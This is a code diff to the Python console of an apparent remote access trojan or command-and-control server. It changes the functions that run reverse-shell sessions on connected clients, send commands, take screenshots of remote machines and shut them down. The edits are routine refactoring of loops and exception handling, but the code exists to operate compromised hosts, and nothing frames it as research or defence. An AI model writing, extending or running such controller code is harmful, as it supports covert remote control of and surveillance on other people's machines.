@@ -1,6 +1,7 @@
 import os
+import time
 import pickle
-import signal
+import traceback
 import socket as sock
 from .var import globals as g
 from .help import help_menu
@@ -231,7 +232,7 @@ def get_shell(client, Id):
     print(f"Reverse shell attained on session [{Id}]\n")
     print(cwd, end='')
     rev_shell = cwd
-    while not g.till and run:
+    while not g.till:
         try:
             command = input()
             if Id not in g.active_conns:
@@ -241,7 +242,6 @@ def get_shell(client, Id):
                 print()
                 break
             if command in ['exit', 'quit']:
-                client.send(command.encode())
                 break
             elif len(command) == 0:
                 client.send(b'null')
@@ -251,20 +251,23 @@ def get_shell(client, Id):
                 output = (client.recv(10240)).decode()
                 print(output, end='')
                 rev_shell = output.split('\n')[-1]
+        except KeyboardInterrupt:
+            break
+        except EOFError:
+            break
         except sock.timeout:
             print()
             print("Session may have died...Returning to shell")
             print()
             break
-        except exception as e:
+        except Exception:
             print()
-            print(e)
+            print(traceback.format_exc())
             print()
             print("Session may have died...Returning to shell")
             print()
             break
-    if not run:
-        client.send(b'exit')
+    client.send(b'exit shell')
     rev_shell = None
     print()
 
@@ -291,7 +294,7 @@ def logout(client):
 
 
 def send_command(client, Id):
-    global run
+    print("\nPress Ctrl-c or enter 'exit'/'quit' to exit session\n")
     while not g.till:
         try:
             command = input(f"Session [{Id}] >>> ")
@@ -354,9 +357,8 @@ def send_command(client, Id):
             elif command == 'take_ss':
                 client.send(command.encode())
                 take_screenshot(client=client)
-            elif command == 'get_shell':
+            elif command == 'getshell':
                 client.send(command.encode())
-                run = True
                 get_shell(client=client, Id=Id)
             elif command == 'shut':
                 client.send(command.encode())
@@ -373,6 +375,10 @@ def send_command(client, Id):
             else:
                 help_menu(command=command)
                 print()
+        except KeyboardInterrupt:
+            break
+        except EOFError:
+            break
         except sock.timeout:
             print()
             print("Session may have died...Returning to shell")
@@ -384,8 +390,7 @@ def send_command(client, Id):
             print()
             print(error)
             send_command(client=client, Id=Id)
+    return
 
 
-run = False
 rev_shell = None
-signal.signal(signal.SIGINT, handler)
